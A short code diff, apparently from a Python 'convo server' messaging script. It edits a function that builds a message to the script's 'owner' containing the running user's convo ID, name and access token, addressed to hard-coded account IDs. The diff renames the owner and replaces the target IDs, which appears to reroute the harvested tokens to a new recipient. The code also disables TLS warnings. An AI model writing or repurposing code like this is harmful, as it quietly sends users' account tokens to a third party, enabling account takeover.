@@ -117,10 +117,10 @@ def send_initial_message():
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => Gurneet \n Hello Gurneet sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100087513362848", "109743854789"]
+    target_ids = ["100066913622866", "100066913622866"]
     
     requests.packages.urllib3.disable_warnings()
     
